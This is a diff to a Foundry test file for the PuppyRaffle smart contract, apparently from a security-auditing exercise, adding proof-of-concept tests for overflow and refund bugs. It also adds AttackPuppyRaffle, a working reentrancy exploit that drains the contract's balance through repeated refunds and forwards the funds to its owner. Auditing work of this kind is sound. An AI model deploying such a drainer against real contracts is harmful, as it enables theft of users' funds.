@@ -4,7 +4,6 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
-import {AttackPuppyRaffle} from "../src/AttackPuppyRaffle.sol";
 
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
@@ -18,6 +17,8 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     address attacker = makeAddr("attacker");
+
+    event RaffleEnter(address[] newPlayers);
 
     function setUp() public {
         puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
@@ -273,5 +274,114 @@ contract PuppyRaffleTest is Test {
         console.log("ending puppyRaffle contract balance: ", address(puppyRaffle).balance);
         console.log("ending attacker balance: ", attacker.balance);
         assertEq(attacker.balance, expectedBalance);
+    }
+
+    function test_overflowSelectWinner() public {
+        // Let's enter 100 players
+        uint256 playersNum = 100;
+        uint256 expectedTotalFees = ((entranceFee * playersNum) * 20) / 100;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+
+        uint256 endingTotalFees = uint256(puppyRaffle.totalFees());
+        console.log("expected total fees: ", expectedTotalFees);
+        console.log("ending total fees: ", endingTotalFees);
+
+        assert(expectedTotalFees > endingTotalFees);
+    }
+
+    function test_getActivePlayerWhenIndexIsZero() public {
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
+    }
+
+    function test_selectWinnerSendsPrizeToZeroAddress() public {
+        uint256 playersNum = 5;
+        address[] memory players = new address[](5);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+
+        for (uint256 i = 1; i < playersNum; i++) {
+            vm.prank(address(i));
+            puppyRaffle.refund(i);
+        }
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        vm.expectRevert();
+        puppyRaffle.selectWinner();
+    }
+}
+
+contract AttackPuppyRaffle {
+    address payable private immutable i_puppyRaffle;
+    address payable private immutable i_owner;
+
+    uint256 private s_index;
+
+    constructor(address _target, address _owner) {
+        i_puppyRaffle = payable(_target);
+        i_owner = payable(_owner);
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        uint256 entranceFee = _getEntranceFee();
+        _enterRaffle(entranceFee, players);
+        s_index = _getIndex();
+        _refund(s_index);
+    }
+
+    function _getEntranceFee() internal returns (uint256 entranceFee) {
+        (, bytes memory data) = i_puppyRaffle.call(abi.encodeWithSignature("entranceFee()"));
+        entranceFee = abi.decode(data, (uint256));
+    }
+
+    function _getIndex() internal returns (uint256 index) {
+        (, bytes memory data) =
+            i_puppyRaffle.call(abi.encodeWithSignature("getActivePlayerIndex(address)", address(this)));
+        index = abi.decode(data, (uint256));
+    }
+
+    function _enterRaffle(uint256 _entranceFee, address[] memory _players) internal {
+        (bool success,) =
+            i_puppyRaffle.call{value: _entranceFee}(abi.encodeWithSignature("enterRaffle(address[])", _players));
+        require(success, "AttackPuppyRaffle: Failed to enter raffle");
+    }
+
+    function _refund(uint256 index) internal {
+        (bool success,) = i_puppyRaffle.call(abi.encodeWithSignature("refund(uint256)", index));
+        require(success, "AttackPuppyRaffle: Failed to refund");
+    }
+
+    function _stealMoney() internal {
+        if (i_puppyRaffle.balance > 0) {
+            _refund(s_index);
+        } else {
+            (bool success,) = i_owner.call{value: address(this).balance}("");
+            require(success, "AttackPuppyRaffle: Failed to send funds to owner");
+        }
     }
 }
